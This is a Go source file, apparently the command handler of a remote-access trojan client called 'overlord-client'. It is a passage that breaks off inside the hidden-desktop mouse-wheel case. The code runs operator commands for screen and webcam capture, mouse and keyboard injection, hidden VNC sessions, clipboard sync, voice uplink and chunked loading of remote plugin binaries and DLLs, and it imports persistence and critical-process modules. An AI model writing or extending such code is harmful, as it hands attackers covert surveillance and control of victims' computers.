package handlers

import (
	"context"
	"encoding/json"
	"errors"
	"log"
	"os"
	"os/exec"
	goruntime "runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"overlord-client/cmd/agent/audio"
	"overlord-client/cmd/agent/capture"
	"overlord-client/cmd/agent/console"
	"overlord-client/cmd/agent/criticalproc"
	"overlord-client/cmd/agent/filesearch"
	"overlord-client/cmd/agent/persistence"
	"overlord-client/cmd/agent/plugins"
	"overlord-client/cmd/agent/runtime"
	"overlord-client/cmd/agent/sysinfo"
	"overlord-client/cmd/agent/wire"
)

var ErrReconnect = errors.New("reconnect requested")

var (
	activeCommands   = make(map[string]context.CancelFunc)
	activeCommandsMu sync.Mutex
	voiceSessionMu   sync.Mutex
	voiceSession     *voiceRuntime
	hvncInputOnce    sync.Once
	hvncInputQueue   chan hvncInputEvent
	hvncInputDropped atomic.Uint64
)

type hvncInputKind int

const (
	hvncInputMouseMove hvncInputKind = iota
	hvncInputMouseDown
	hvncInputMouseUp
	hvncInputMouseWheel
	hvncInputKeyDown
	hvncInputKeyUp
)

type hvncInputEvent struct {
	kind    hvncInputKind
	display int
	x       int32
	y       int32
	button  int
	delta   int32
	vk      uint16
}

type voiceRuntime struct {
	sessionID string
	cancel    context.CancelFunc
	session   *audio.Session
}

func cancelAllCommands() {
	activeCommandsMu.Lock()
	defer activeCommandsMu.Unlock()
	for id, cancel := range activeCommands {
		if cancel != nil {
			cancel()
		}
		delete(activeCommands, id)
	}
}

func resetForReconnect(env *runtime.Env) {
	if env == nil {
		return
	}

	cancelAllCommands()
	capture.ResetFrameSlots()

	env.DesktopMu.Lock()
	if env.DesktopCancel != nil {
		env.DesktopCancel()
	}
	waitStreamStop(env.DesktopDone, "desktop")
	env.DesktopCancel = nil
	env.DesktopDone = nil
	env.MouseControl = false
	env.KeyboardControl = false
	env.CursorCapture = false
	env.SelectedDisplay = GetPersistedDisplay()
	env.DesktopMu.Unlock()

	env.HVNCMu.Lock()
	if env.HVNCCancel != nil {
		env.HVNCCancel()
	}
	waitStreamStop(env.HVNCDone, "hvnc")
	env.HVNCCancel = nil
	env.HVNCDone = nil
	env.HVNCMouseControl = false
	env.HVNCKeyboardControl = false
	env.HVNCCursorCapture = false
	env.HVNCSelectedDisplay = 0
	env.HVNCMu.Unlock()

	env.WebcamMu.Lock()
	if env.WebcamCancel != nil {
		env.WebcamCancel()
	}
	waitStreamStop(env.WebcamDone, "webcam")
	env.WebcamCancel = nil
	env.WebcamDone = nil
	env.WebcamDeviceIndex = 0
	env.WebcamFPS = 30
	env.WebcamUseMaxFPS = false
	env.WebcamMu.Unlock()

	if env.Console != nil {
		env.Console.StopAll()
	}

	stopVoiceSession()

	CleanupAllTunnels()

	env.NotificationMu.Lock()
	env.NotificationKeywords = nil
	env.NotificationMinIntervalMs = 0
	env.NotificationMu.Unlock()
}

func removePersistence() error {
	return persistence.Remove()
}

func registerCancellableCommand(cmdID string, cancel context.CancelFunc) {
	activeCommandsMu.Lock()
	defer activeCommandsMu.Unlock()
	activeCommands[cmdID] = cancel
}

func unregisterCommand(cmdID string) {
	activeCommandsMu.Lock()
	defer activeCommandsMu.Unlock()
	delete(activeCommands, cmdID)
}

func waitStreamStop(done <-chan struct{}, name string) {
	if done == nil {
		return
	}
	select {
	case <-done:
		return
	case <-time.After(2 * time.Second):
		log.Printf("%s: stop timed out", name)
	}
}

func ensureHVNCInputWorker() {
	hvncInputOnce.Do(func() {
		hvncInputQueue = make(chan hvncInputEvent, 1024)
		goSafe("hvnc input worker", nil, func() {
			for ev := range hvncInputQueue {
				switch ev.kind {
				case hvncInputMouseMove:
					if err := capture.HVNCInputMouseMove(ev.display, ev.x, ev.y); err != nil {
						log.Printf("hvnc input worker: mouse_move failed: %v", err)
					}
				case hvncInputMouseDown:
					if ev.x != 0 || ev.y != 0 {
						_ = capture.HVNCInputMouseMove(ev.display, ev.x, ev.y)
					}
					if err := capture.HVNCInputMouseDown(ev.button); err != nil {
						log.Printf("hvnc input worker: mouse_down failed: %v", err)
					}
				case hvncInputMouseUp:
					if ev.x != 0 || ev.y != 0 {
						_ = capture.HVNCInputMouseMove(ev.display, ev.x, ev.y)
					}
					if err := capture.HVNCInputMouseUp(ev.button); err != nil {
						log.Printf("hvnc input worker: mouse_up failed: %v", err)
					}
				case hvncInputMouseWheel:
					if ev.x != 0 || ev.y != 0 {
						_ = capture.HVNCInputMouseMove(ev.display, ev.x, ev.y)
					}
					if err := capture.HVNCInputMouseWheel(ev.delta); err != nil {
						log.Printf("hvnc input worker: mouse_wheel failed: %v", err)
					}
				case hvncInputKeyDown:
					if err := capture.HVNCInputKeyDown(ev.vk); err != nil {
						log.Printf("hvnc input worker: key_down vk=%d failed: %v", ev.vk, err)
					}
				case hvncInputKeyUp:
					if err := capture.HVNCInputKeyUp(ev.vk); err != nil {
						log.Printf("hvnc input worker: key_up vk=%d failed: %v", ev.vk, err)
					}
				}
			}
		})
	})
}

func enqueueHVNCInput(ev hvncInputEvent) {
	ensureHVNCInputWorker()
	select {
	case hvncInputQueue <- ev:
		return
	default:
		if ev.kind == hvncInputMouseMove {
			dropped := hvncInputDropped.Add(1)
			if dropped%100 == 1 {
				log.Printf("hvnc input queue: dropping mouse_move events dropped=%d", dropped)
			}
			return
		}
		t := time.NewTimer(200 * time.Millisecond)
		defer t.Stop()
		select {
		case hvncInputQueue <- ev:
		case <-t.C:
			log.Printf("hvnc input queue: enqueue timeout kind=%d", ev.kind)
		}
	}
}

func clearHVNCInputQueue() {
	if hvncInputQueue == nil {
		return
	}
	for {
		select {
		case <-hvncInputQueue:
		default:
			return
		}
	}
}

func payloadAsMap(payload interface{}) map[string]interface{} {
	switch v := payload.(type) {
	case map[string]interface{}:
		return v
	case map[interface{}]interface{}:
		out := make(map[string]interface{}, len(v))
		for key, val := range v {
			switch ks := key.(type) {
			case string:
				out[ks] = val
			case []byte:
				out[string(ks)] = val
			}
		}
		return out
	default:
		return nil
	}
}

func payloadInt32(payload map[string]interface{}, key string) (int32, bool) {
	if payload == nil {
		return 0, false
	}
	if v, ok := payload[key]; ok {
		switch val := v.(type) {
		case float64:
			return int32(val), true
		case float32:
			return int32(val), true
		case int:
			return int32(val), true
		case int8:
			return int32(val), true
		case int16:
			return int32(val), true
		case int32:
			return val, true
		case int64:
			return int32(val), true
		case uint:
			return int32(val), true
		case uint8:
			return int32(val), true
		case uint16:
			return int32(val), true
		case uint32:
			return int32(val), true
		case uint64:
			return int32(val), true
		}
	}
	return 0, false
}

func payloadInt(payload map[string]interface{}, key string) (int, bool) {
	if payload == nil {
		return 0, false
	}
	if v, ok := payload[key]; ok {
		switch val := v.(type) {
		case float64:
			return int(val), true
		case float32:
			return int(val), true
		case int:
			return val, true
		case int8:
			return int(val), true
		case int16:
			return int(val), true
		case int32:
			return int(val), true
		case int64:
			return int(val), true
		case uint:
			return int(val), true
		case uint8:
			return int(val), true
		case uint16:
			return int(val), true
		case uint32:
			return int(val), true
		case uint64:
			return int(val), true
		}
	}
	return 0, false
}

func cancelCommand(cmdID string) bool {
	activeCommandsMu.Lock()
	defer activeCommandsMu.Unlock()
	if cancel, exists := activeCommands[cmdID]; exists {
		cancel()
		delete(activeCommands, cmdID)
		return true
	}
	return false
}

func sendCommandResultSafe(env *runtime.Env, cmdID string, ok bool, message string) {
	res := wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: ok}
	if message != "" {
		res.Message = message
	}
	if err := wire.WriteMsg(context.Background(), env.Conn, res); err != nil {
		log.Printf("command_result send failed: %v", err)
	}
}

func sendCommandResultAsync(env *runtime.Env, cmdID string) {
	go sendCommandResultSafe(env, cmdID, true, "")
}

func payloadNumberToInt64(value interface{}) int64 {
	switch v := value.(type) {
	case int:
		return int64(v)
	case int8:
		return int64(v)
	case int16:
		return int64(v)
	case int32:
		return int64(v)
	case int64:
		return v
	case uint:
		return int64(v)
	case uint8:
		return int64(v)
	case uint16:
		return int64(v)
	case uint32:
		return int64(v)
	case uint64:
		return int64(v)
	case float32:
		return int64(v)
	case float64:
		return int64(v)
	default:
		return 0
	}
}

func stopVoiceSession() {
	voiceSessionMu.Lock()
	v := voiceSession
	voiceSession = nil
	voiceSessionMu.Unlock()
	if v == nil {
		return
	}
	if v.cancel != nil {
		v.cancel()
	}
	if v.session != nil {
		_ = v.session.Close()
	}
}

func startVoiceSession(ctx context.Context, env *runtime.Env, sessionID string, source string) error {
	if sessionID == "" {
		return errors.New("missing voice session id")
	}

	stopVoiceSession()

	vCtx, cancel := context.WithCancel(ctx)
	session, err := audio.StartVoiceSession(vCtx, source, func(chunk []byte) {
		if len(chunk) == 0 {
			return
		}
		msg := map[string]interface{}{
			"type":      "voice_uplink",
			"sessionId": sessionID,
			"data":      chunk,
		}
		_ = wire.WriteMsg(vCtx, env.Conn, msg)
	})
	if err != nil {
		cancel()
		return err
	}

	v := &voiceRuntime{sessionID: sessionID, cancel: cancel, session: session}
	voiceSessionMu.Lock()
	voiceSession = v
	voiceSessionMu.Unlock()

	return nil
}

func writeVoiceDownlink(data []byte) error {
	voiceSessionMu.Lock()
	v := voiceSession
	voiceSessionMu.Unlock()
	if v == nil || len(data) == 0 {
		return nil
	}
	if v.session == nil {
		return errors.New("voice session not ready")
	}
	if err := v.session.WritePlayback(data); err != nil {
		return err
	}
	return nil
}

func extractDLLBytes(payload map[string]interface{}) []byte {
	if payload == nil {
		return nil
	}
	switch v := payload["dll"].(type) {
	case []byte:
		return v
	case string:
		if len(v) > 0 {
			return []byte(v)
		}
	}
	return nil
}

func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]interface{}) error {
	cmdID, _ := envelope["id"].(string)
	action, _ := envelope["commandType"].(string)

	switch action {
	case "screenshot":
		payload, _ := envelope["payload"].(map[string]interface{})
		allDisplays := false
		if payload != nil {
			if v, ok := payload["allDisplays"].(bool); ok && v {
				allDisplays = true
			} else if mode, ok := payload["mode"].(string); ok && mode == "notification" {
				allDisplays = true
			}
		}
		if goruntime.GOOS == "windows" {
			allDisplays = true
		}
		return HandleScreenshot(ctx, env, cmdID, allDisplays)
	case "plugin_load":
		payload, _ := envelope["payload"].(map[string]interface{})
		if payload == nil {
			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: "missing payload"})
		}
		manifestRaw, _ := payload["manifest"].(map[string]interface{})
		binaryBytes, _ := payload["binary"].([]byte)
		if env.Plugins == nil {
			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: "plugin manager not ready"})
		}
		manifest, err := plugins.ManifestFromMap(manifestRaw)
		if err != nil {
			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: err.Error()})
		}
		if err := env.Plugins.Load(ctx, manifest, binaryBytes); err != nil {
			_ = wire.WriteMsg(ctx, env.Conn, wire.PluginEvent{Type: "plugin_event", PluginID: manifest.ID, Event: "error", Error: err.Error()})
			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: err.Error()})
		}
		_ = wire.WriteMsg(ctx, env.Conn, wire.PluginEvent{Type: "plugin_event", PluginID: manifest.ID, Event: "loaded"})
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
	case "plugin_load_init":
		payload, _ := envelope["payload"].(map[string]interface{})
		if payload == nil || env.Plugins == nil {
			return nil
		}
		manifestRaw, _ := payload["manifest"].(map[string]interface{})
		totalSize := toInt(payload["size"])
		totalChunks := toInt(payload["chunks"])
		manifest, err := plugins.ManifestFromMap(manifestRaw)
		if err != nil {
			return nil
		}
		_ = env.Plugins.StartBundle(manifest, totalSize, totalChunks)
		return nil
	case "plugin_load_chunk":
		payload, _ := envelope["payload"].(map[string]interface{})
		if payload == nil || env.Plugins == nil {
			return nil
		}
		pluginId, _ := payload["pluginId"].(string)
		index := toInt(payload["index"])
		data, _ := payload["data"].([]byte)
		_ = env.Plugins.AddChunk(pluginId, index, data)
		return nil
	case "plugin_load_finish":
		payload, _ := envelope["payload"].(map[string]interface{})
		if payload == nil || env.Plugins == nil {
			return nil
		}
		pluginId, _ := payload["pluginId"].(string)
		if pluginId == "" {
			return nil
		}
		if err := env.Plugins.FinalizeBundle(ctx, pluginId); err != nil {
			_ = wire.WriteMsg(ctx, env.Conn, wire.PluginEvent{Type: "plugin_event", PluginID: pluginId, Event: "error", Error: err.Error()})
			return nil
		}
		_ = wire.WriteMsg(ctx, env.Conn, wire.PluginEvent{Type: "plugin_event", PluginID: pluginId, Event: "loaded"})
		return nil
	case "plugin_unload":
		payload, _ := envelope["payload"].(map[string]interface{})
		if payload == nil || env.Plugins == nil {
			return nil
		}
		pluginId, _ := payload["pluginId"].(string)
		if pluginId == "" {
			return nil
		}
		env.Plugins.Unload(pluginId)
		_ = wire.WriteMsg(ctx, env.Conn, wire.PluginEvent{Type: "plugin_event", PluginID: pluginId, Event: "unloaded"})
		return nil
	case "desktop_start":
		if goruntime.GOOS == "darwin" {
			perms := sysinfo.DarwinPermissions()
			var missing []string
			if !perms["screenRecording"] {
				missing = append(missing, "screenRecording")
			}
			if !perms["accessibility"] {
				missing = append(missing, "accessibility")
			}
			if len(missing) > 0 {
				log.Printf("desktop: macOS missing permissions: %v", missing)
				detail, _ := json.Marshal(map[string]interface{}{
					"reason":      "permissions_denied",
					"missing":     missing,
					"permissions": perms,
				})
				sendCommandResultSafe(env, cmdID, false, string(detail))
				return nil
			}
		}
		env.DesktopMu.Lock()
		if env.DesktopCancel != nil {
			env.DesktopCancel()
			waitStreamStop(env.DesktopDone, "desktop")
		}
		desktopCtx, cancel := context.WithCancel(ctx)
		env.DesktopCancel = cancel
		done := make(chan struct{})
		env.DesktopDone = done
		goSafe("desktop stream", env.Cancel, func() {
			log.Printf("desktop: start requested")
			_ = DesktopStart(desktopCtx, env)
			close(done)
		})
		env.DesktopMu.Unlock()
		sendCommandResultSafe(env, cmdID, true, "")
		return nil
	case "desktop_stop":
		env.DesktopMu.Lock()
		log.Printf("desktop: stop requested")
		if env.DesktopCancel != nil {
			env.DesktopCancel()
		}
		waitStreamStop(env.DesktopDone, "desktop")
		env.DesktopCancel = nil
		env.DesktopDone = nil
		env.DesktopMu.Unlock()
		sendCommandResultSafe(env, cmdID, true, "")
		return nil
	case "desktop_select_display":

		payload, _ := envelope["payload"].(map[string]interface{})
		disp := 0
		if payload != nil {
			displayVal := payload["display"]

			if v, ok := displayVal.(int8); ok {
				disp = int(v)
			} else if v, ok := displayVal.(int16); ok {
				disp = int(v)
			} else if v, ok := displayVal.(int32); ok {
				disp = int(v)
			} else if v, ok := displayVal.(int64); ok {
				disp = int(v)
			} else if v, ok := displayVal.(int); ok {
				disp = v
			} else if v, ok := displayVal.(uint8); ok {
				disp = int(v)
			} else if v, ok := displayVal.(float64); ok {
				disp = int(v)
			}
		}
		log.Printf("desktop: select display %d", disp)
		_ = DesktopSelect(ctx, env, disp)
		sendCommandResultSafe(env, cmdID, true, "")
		return nil
	case "desktop_enable_mouse":
		payload, _ := envelope["payload"].(map[string]interface{})
		enabled := true
		if payload != nil {
			if v, ok := payload["enabled"].(bool); ok {
				enabled = v
			}
		}
		log.Printf("desktop: mouse control %v", enabled)
		_ = DesktopMouseControl(ctx, env, enabled)
		sendCommandResultSafe(env, cmdID, true, "")
		return nil
	case "desktop_enable_keyboard":
		payload, _ := envelope["payload"].(map[string]interface{})
		enabled := true
		if payload != nil {
			if v, ok := payload["enabled"].(bool); ok {
				enabled = v
			}
		}
		log.Printf("desktop: keyboard control %v", enabled)
		_ = DesktopKeyboardControl(ctx, env, enabled)
		sendCommandResultSafe(env, cmdID, true, "")
		return nil
	case "desktop_enable_cursor":
		payload, _ := envelope["payload"].(map[string]interface{})
		enabled := false
		if payload != nil {
			if v, ok := payload["enabled"].(bool); ok {
				enabled = v
			}
		}
		log.Printf("desktop: cursor capture %v", enabled)
		_ = DesktopCursorControl(ctx, env, enabled)
		sendCommandResultSafe(env, cmdID, true, "")
		return nil
	case "desktop_set_duplication":
		payload, _ := envelope["payload"].(map[string]interface{})
		enabled := false
		if payload != nil {
			if v, ok := payload["enabled"].(bool); ok {
				enabled = v
			}
		}
		log.Printf("desktop: duplication capture %v", enabled)
		_ = DesktopDuplicationControl(ctx, env, enabled)
		sendCommandResultSafe(env, cmdID, true, "")
		return nil
	case "desktop_set_quality":
		payload, _ := envelope["payload"].(map[string]interface{})
		quality := 90
		codec := ""
		reason := ""
		source := ""
		if payload != nil {
			if q, ok := payloadInt(payload, "quality"); ok {
				quality = q
			}
			if v, ok := payload["codec"].(string); ok {
				codec = v
			}
			if v, ok := payload["reason"].(string); ok {
				reason = strings.TrimSpace(v)
			}
			if v, ok := payload["source"].(string); ok {
				source = strings.TrimSpace(v)
			}
		}
		if source != "" || reason != "" {
			log.Printf("desktop: set quality=%d codec=%s source=%s reason=%s", quality, codec, source, reason)
		} else {
			log.Printf("desktop: set quality=%d codec=%s", quality, codec)
		}
		capture.SetQualityAndCodec(quality, codec)
		sendCommandResultSafe(env, cmdID, true, "")
		return nil
	case "desktop_set_resolution":
		payload, _ := envelope["payload"].(map[string]interface{})
		maxH := 0 // default = 1080p cap
		if payload != nil {
			if v, ok := payloadInt(payload, "maxHeight"); ok {
				maxH = v
			}
		}
		log.Printf("desktop: set max resolution height=%d", maxH)
		capture.SetMaxResolution(maxH)
		sendCommandResultSafe(env, cmdID, true, "")
		return nil
	case "clipboard_sync_start":
		payload, _ := envelope["payload"].(map[string]interface{})
		source := "rd"
		if payload != nil {
			if v, ok := payload["source"].(string); ok && v != "" {
				source = v
			}
		}
		env.ClipboardSyncMu.Lock()
		if env.ClipboardSyncCancel != nil {
			env.ClipboardSyncCancel()
			if env.ClipboardSyncDone != nil {
				<-env.ClipboardSyncDone
			}
		}
		syncCtx, syncCancel := context.WithCancel(ctx)
		env.ClipboardSyncCancel = syncCancel
		env.ClipboardSyncSource = source
		done := make(chan struct{})
		env.ClipboardSyncDone = done
		goSafe("clipboard_sync", env.Cancel, func() {
			ClipboardSyncStart(syncCtx, env, source)
			close(done)
		})
		env.ClipboardSyncMu.Unlock()
		log.Printf("clipboard_sync: start (%s)", source)
		sendCommandResultSafe(env, cmdID, true, "")
		return nil
	case "clipboard_sync_stop":
		env.ClipboardSyncMu.Lock()
		if env.ClipboardSyncCancel != nil {
			env.ClipboardSyncCancel()
			if env.ClipboardSyncDone != nil {
				<-env.ClipboardSyncDone
			}
			env.ClipboardSyncCancel = nil
			env.ClipboardSyncDone = nil
		}
		env.ClipboardSyncMu.Unlock()
		log.Printf("clipboard_sync: stop")
		sendCommandResultSafe(env, cmdID, true, "")
		return nil
	case "clipboard_set":
		payload, _ := envelope["payload"].(map[string]interface{})
		text := ""
		if payload != nil {
			if v, ok := payload["text"].(string); ok {
				text = v
			}
		}
		ClipboardSyncSet(text)
		sendCommandResultSafe(env, cmdID, true, "")
		return nil
	case "resource_usage":
		return HandleResourceUsage(ctx, env, cmdID)
	case "desktop_mouse_move":
		if !env.MouseControl {
			sendCommandResultAsync(env, cmdID)
			return nil
		}
		payload := payloadAsMap(envelope["payload"])
		x, _ := payloadInt32(payload, "x")
		y, _ := payloadInt32(payload, "y")
		absX, absY := resolveDesktopPoint(env.SelectedDisplay, x, y)
		setCursorPos(absX, absY)
		sendCommandResultAsync(env, cmdID)
		return nil
	case "desktop_mouse_down":
		if !env.MouseControl {
			sendCommandResultAsync(env, cmdID)
			return nil
		}
		payload := payloadAsMap(envelope["payload"])
		btn, _ := payloadInt(payload, "button")
		if x, okX := payloadInt32(payload, "x"); okX {
			if y, okY := payloadInt32(payload, "y"); okY {
				absX, absY := resolveDesktopPoint(env.SelectedDisplay, x, y)
				setCursorPos(absX, absY)
			}
		}
		sendMouseDown(btn)
		sendCommandResultAsync(env, cmdID)
		return nil
	case "desktop_mouse_up":
		if !env.MouseControl {
			sendCommandResultAsync(env, cmdID)
			return nil
		}
		payload := payloadAsMap(envelope["payload"])
		btn, _ := payloadInt(payload, "button")
		if x, okX := payloadInt32(payload, "x"); okX {
			if y, okY := payloadInt32(payload, "y"); okY {
				absX, absY := resolveDesktopPoint(env.SelectedDisplay, x, y)
				setCursorPos(absX, absY)
			}
		}
		sendMouseUp(btn)
		sendCommandResultAsync(env, cmdID)
		return nil
	case "desktop_key_down":
		if !env.KeyboardControl {
			sendCommandResultAsync(env, cmdID)
			return nil
		}
		payload, _ := envelope["payload"].(map[string]interface{})
		code := ""
		if payload != nil {
			if v, ok := payload["code"].(string); ok {
				code = v
			}
		}
		if vk := keyCodeToVK(code); vk != 0 {
			sendKeyDown(vk)
		}
		sendCommandResultAsync(env, cmdID)
		return nil
	case "desktop_key_up":
		if !env.KeyboardControl {
			sendCommandResultAsync(env, cmdID)
			return nil
		}
		payload, _ := envelope["payload"].(map[string]interface{})
		code := ""
		if payload != nil {
			if v, ok := payload["code"].(string); ok {
				code = v
			}
		}
		if vk := keyCodeToVK(code); vk != 0 {
			sendKeyUp(vk)
		}
		sendCommandResultAsync(env, cmdID)
		return nil
	case "desktop_text":
		if !env.KeyboardControl {
			sendCommandResultAsync(env, cmdID)
			return nil
		}
		payload, _ := envelope["payload"].(map[string]interface{})
		text := ""
		if payload != nil {
			if v, ok := payload["text"].(string); ok {
				text = v
			}
		}
		if text != "" {
			sendTextInput(text)
		}
		sendCommandResultAsync(env, cmdID)
		return nil

	// ==================== HVNC COMMANDS ====================
	case "hvnc_start":
		payload, _ := envelope["payload"].(map[string]interface{})
		autoStartExplorer := false
		if payload != nil {
			if v, ok := payload["autoStartExplorer"].(bool); ok {
				autoStartExplorer = v
			}
		}
		env.HVNCMu.Lock()
		if env.HVNCCancel != nil {
			env.HVNCCancel()
			waitStreamStop(env.HVNCDone, "hvnc")
		}
		hvncCtx, cancel := context.WithCancel(ctx)
		env.HVNCCancel = cancel
		done := make(chan struct{})
		env.HVNCDone = done
		goSafe("hvnc stream", env.Cancel, func() {
			log.Printf("hvnc: start requested (autoStartExplorer=%v)", autoStartExplorer)
			_ = HVNCStart(hvncCtx, env, autoStartExplorer)
			close(done)
		})
		env.HVNCMu.Unlock()
		sendCommandResultSafe(env, cmdID, true, "")
		return nil
	case "hvnc_stop":
		env.HVNCMu.Lock()
		log.Printf("hvnc: stop requested")
		env.HVNCMouseControl = false
		env.HVNCKeyboardControl = false
		env.HVNCCursorCapture = false
		clearHVNCInputQueue()
		if env.HVNCCancel != nil {
			env.HVNCCancel()
		}
		waitStreamStop(env.HVNCDone, "hvnc")
		env.HVNCCancel = nil
		env.HVNCDone = nil
		env.HVNCMu.Unlock()
		sendCommandResultSafe(env, cmdID, true, "")
		return nil
	case "hvnc_select_display":
		payload, _ := envelope["payload"].(map[string]interface{})
		disp := 0
		if payload != nil {
			displayVal := payload["display"]
			if v, ok := displayVal.(int8); ok {
				disp = int(v)
			} else if v, ok := displayVal.(int16); ok {
				disp = int(v)
			} else if v, ok := displayVal.(int32); ok {
				disp = int(v)
			} else if v, ok := displayVal.(int64); ok {
				disp = int(v)
			} else if v, ok := displayVal.(int); ok {
				disp = v
			} else if v, ok := displayVal.(uint8); ok {
				disp = int(v)
			} else if v, ok := displayVal.(float64); ok {
				disp = int(v)
			}
		}
		log.Printf("hvnc: select display %d", disp)
		_ = HVNCSelect(ctx, env, disp)
		sendCommandResultSafe(env, cmdID, true, "")
		return nil
	case "hvnc_enable_mouse":
		payload, _ := envelope["payload"].(map[string]interface{})
		enabled := true
		if payload != nil {
			if v, ok := payload["enabled"].(bool); ok {
				enabled = v
			}
		}
		log.Printf("hvnc: mouse control %v", enabled)
		_ = HVNCMouseControl(ctx, env, enabled)
		sendCommandResultSafe(env, cmdID, true, "")
		return nil
	case "hvnc_enable_keyboard":
		payload, _ := envelope["payload"].(map[string]interface{})
		enabled := true
		if payload != nil {
			if v, ok := payload["enabled"].(bool); ok {
				enabled = v
			}
		}
		log.Printf("hvnc: keyboard control %v", enabled)
		_ = HVNCKeyboardControl(ctx, env, enabled)
		sendCommandResultSafe(env, cmdID, true, "")
		return nil
	case "hvnc_enable_cursor":
		payload, _ := envelope["payload"].(map[string]interface{})
		enabled := false
		if payload != nil {
			if v, ok := payload["enabled"].(bool); ok {
				enabled = v
			}
		}
		log.Printf("hvnc: cursor capture %v", enabled)
		_ = HVNCCursorControl(ctx, env, enabled)
		sendCommandResultSafe(env, cmdID, true, "")
		return nil
	case "hvnc_set_quality":
		payload, _ := envelope["payload"].(map[string]interface{})
		quality := 90
		codec := ""
		if payload != nil {
			if q, ok := payloadInt(payload, "quality"); ok {
				quality = q
			}
			if v, ok := payload["codec"].(string); ok {
				codec = v
			}
		}
		log.Printf("hvnc: set quality=%d codec=%s", quality, codec)
		capture.SetQualityAndCodec(quality, codec)
		sendCommandResultSafe(env, cmdID, true, "")
		return nil
	case "hvnc_mouse_move":
		if !env.HVNCMouseControl {
			sendCommandResultSafe(env, cmdID, true, "")
			return nil
		}
		payload, _ := envelope["payload"].(map[string]interface{})
		x, y := int32(0), int32(0)
		if payload != nil {
			switch v := payload["x"].(type) {
			case float64:
				x = int32(v)
			case float32:
				x = int32(v)
			case int:
				x = int32(v)
			case int8:
				x = int32(v)
			case int16:
				x = int32(v)
			case int32:
				x = v
			case int64:
				x = int32(v)
			case uint:
				x = int32(v)
			case uint8:
				x = int32(v)
			case uint16:
				x = int32(v)
			case uint32:
				x = int32(v)
			case uint64:
				x = int32(v)
			}
			switch v := payload["y"].(type) {
			case float64:
				y = int32(v)
			case float32:
				y = int32(v)
			case int:
				y = int32(v)
			case int8:
				y = int32(v)
			case int16:
				y = int32(v)
			case int32:
				y = v
			case int64:
				y = int32(v)
			case uint:
				y = int32(v)
			case uint8:
				y = int32(v)
			case uint16:
				y = int32(v)
			case uint32:
				y = int32(v)
			case uint64:
				y = int32(v)
			}
		}
		enqueueHVNCInput(hvncInputEvent{kind: hvncInputMouseMove, display: env.HVNCSelectedDisplay, x: x, y: y})
		return nil
	case "hvnc_mouse_down":
		if !env.HVNCMouseControl {
			sendCommandResultSafe(env, cmdID, true, "")
			return nil
		}
		payload, _ := envelope["payload"].(map[string]interface{})
		btn := 0
		x, y := int32(0), int32(0)
		if payload != nil {
			switch v := payload["button"].(type) {
			case float64:
				btn = int(v)
			case float32:
				btn = int(v)
			case int:
				btn = v
			case int8:
				btn = int(v)
			case int16:
				btn = int(v)
			case int32:
				btn = int(v)
			case int64:
				btn = int(v)
			case uint:
				btn = int(v)
			case uint8:
				btn = int(v)
			case uint16:
				btn = int(v)
			case uint32:
				btn = int(v)
			case uint64:
				btn = int(v)
			}
			switch v := payload["x"].(type) {
			case float64:
				x = int32(v)
			case float32:
				x = int32(v)
			case int:
				x = int32(v)
			case int8:
				x = int32(v)
			case int16:
				x = int32(v)
			case int32:
				x = v
			case int64:
				x = int32(v)
			case uint:
				x = int32(v)
			case uint8:
				x = int32(v)
			case uint16:
				x = int32(v)
			case uint32:
				x = int32(v)
			case uint64:
				x = int32(v)
			}
			switch v := payload["y"].(type) {
			case float64:
				y = int32(v)
			case float32:
				y = int32(v)
			case int:
				y = int32(v)
			case int8:
				y = int32(v)
			case int16:
				y = int32(v)
			case int32:
				y = v
			case int64:
				y = int32(v)
			case uint:
				y = int32(v)
			case uint8:
				y = int32(v)
			case uint16:
				y = int32(v)
			case uint32:
				y = int32(v)
			case uint64:
				y = int32(v)
			}
		}
		enqueueHVNCInput(hvncInputEvent{kind: hvncInputMouseDown, display: env.HVNCSelectedDisplay, button: btn, x: x, y: y})
		return nil
	case "hvnc_mouse_up":
		if !env.HVNCMouseControl {
			sendCommandResultSafe(env, cmdID, true, "")
			return nil
		}
		payload, _ := envelope["payload"].(map[string]interface{})
		btn := 0
		x, y := int32(0), int32(0)
		if payload != nil {
			switch v := payload["button"].(type) {
			case float64:
				btn = int(v)
			case float32:
				btn = int(v)
			case int:
				btn = v
			case int8:
				btn = int(v)
			case int16:
				btn = int(v)
			case int32:
				btn = int(v)
			case int64:
				btn = int(v)
			case uint:
				btn = int(v)
			case uint8:
				btn = int(v)
			case uint16:
				btn = int(v)
			case uint32:
				btn = int(v)
			case uint64:
				btn = int(v)
			}
			switch v := payload["x"].(type) {
			case float64:
				x = int32(v)
			case float32:
				x = int32(v)
			case int:
				x = int32(v)
			case int8:
				x = int32(v)
			case int16:
				x = int32(v)
			case int32:
				x = v
			case int64:
				x = int32(v)
			case uint:
				x = int32(v)
			case uint8:
				x = int32(v)
			case uint16:
				x = int32(v)
			case uint32:
				x = int32(v)
			case uint64:
				x = int32(v)
			}
			switch v := payload["y"].(type) {
			case float64:
				y = int32(v)
			case float32:
				y = int32(v)
			case int:
				y = int32(v)
			case int8:
				y = int32(v)
			case int16:
				y = int32(v)
			case int32:
				y = v
			case int64:
				y = int32(v)
			case uint:
				y = int32(v)
			case uint8:
				y = int32(v)
			case uint16:
				y = int32(v)
			case uint32:
				y = int32(v)
			case uint64:
				y = int32(v)
			}
		}
		enqueueHVNCInput(hvncInputEvent{kind: hvncInputMouseUp, display: env.HVNCSelectedDisplay, button: btn, x: x, y: y})
		return nil
	case "hvnc_mouse_wheel":
		if !env.HVNCMouseControl {
			sendCommandResultSafe(env, cmdID, true, "")
			return nil
		}
		payload, _ := envelope["payload"].(map[string]interface{})
		delta := int32(0)
		x, y := int32(0), int32(0)
		if payload != nil {
			switch v := payload["delta"].(type) {
			case float64:
				delta = int32(v)
			case float32:
				delta = int32(v)
			case int:
				delta = int32(v)
			case int8:
				delta = int32(v)
			case int16:
				delta = int32(v)
			case int32:
				delta = v
			case int64:
				delta = int32(v)
			case uint:
